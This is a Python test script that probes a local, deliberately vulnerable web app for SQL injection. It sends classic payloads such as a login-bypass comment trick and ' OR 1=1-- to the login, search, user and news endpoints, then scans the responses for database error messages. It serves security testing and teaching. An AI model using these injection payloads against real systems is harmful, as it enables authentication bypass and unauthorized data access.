#!/usr/bin/env python3
"""
Manual test script to verify SQL injection vulnerabilities
"""

import requests
import time

def test_vulnerabilities():
    base_url = "http://localhost:5000"
    
    # Test cases with expected SQL injection
    test_cases = [
        # Login bypass attempts
        f"{base_url}/login?username=admin'--&password=anything",
        f"{base_url}/login?username=' OR 1=1--&password=test",
        
        # Search injection
        f"{base_url}/search?q='",
        f"{base_url}/search?q=' OR 1=1--",
        
        # User profile injection
        f"{base_url}/user?id='",
        f"{base_url}/user?id=1' OR 1=1--",
        
        # News injection  
        f"{base_url}/news?category='",
        f"{base_url}/news?category=' OR 1=1--",
    ]
    
    print("🧪 Testing SQL Injection Vulnerabilities")
    print("=" * 50)
    
    vulnerable_found = []
    
    for i, url in enumerate(test_cases, 1):
        try:
            print(f"[{i:2d}] Testing: {url}")
            response = requests.get(url, timeout=10)
            
            # Check for SQL error indicators
            content = response.text.lower()
            sql_error_indicators = [
                "sql syntax error",
                "sql error", 
                "database error",
                "syntax error",
                "unclosed quotation mark",
                "quoted string not properly terminated"
            ]
            
            found_errors = []
            for indicator in sql_error_indicators:
                if indicator in content:
                    found_errors.append(indicator)
            
            if found_errors:
                print(f"     ✅ VULNERABLE! Found: {', '.join(found_errors)}")
                vulnerable_found.append(url)
            else:
                print(f"     ❌ No SQL errors detected")
                
        except Exception as e:
            print(f"     ⚠️  Error testing URL: {e}")
            
        time.sleep(0.5)  # Small delay between requests
    
    print("\n" + "=" * 50)
    print(f"📊 Summary: Found {len(vulnerable_found)} vulnerable endpoints")
    
    if vulnerable_found:
        print("\n🚨 Vulnerable URLs:")
        for url in vulnerable_found:
            print(f"   - {url}")
    else:
        print("\n⚠️  No vulnerabilities detected. Check if the app is running.")
    
    return len(vulnerable_found) > 0

if __name__ == "__main__":
    # Check if the app is running
    try:
        response = requests.get("http://localhost:5000", timeout=5)
        if response.status_code == 200:
            print("✅ Vulnerable app is accessible")
            test_vulnerabilities()
        else:
            print("❌ App is not responding correctly")
    except requests.exceptions.RequestException:
        print("❌ Cannot connect to http://localhost:5000")
        print("💡 Make sure to run 'python vulnerable_app.py' first")
